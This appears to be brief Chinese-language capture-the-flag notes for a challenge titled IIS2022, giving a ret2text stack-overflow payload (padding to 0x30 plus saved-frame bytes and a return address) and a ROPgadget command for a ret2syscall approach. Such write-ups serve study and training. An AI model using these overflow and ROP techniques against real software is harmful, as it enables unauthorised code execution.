# IIS2022
# Method 1 ret2text
反编译得到overflow函数中copy字符串距离ebp的长度为0x30
输入'a' * 0x30 + 'b' * 0x08 + 0x000000000040121E 填充
将返回地址修改为 system 指令所在地址

# Method 2 ret2syscall
https://www.dazhuanlan.com/zhjnlb/topics/1242953
ROPgadget --binary ret2syscall --only "pop|ret" | grep "rax"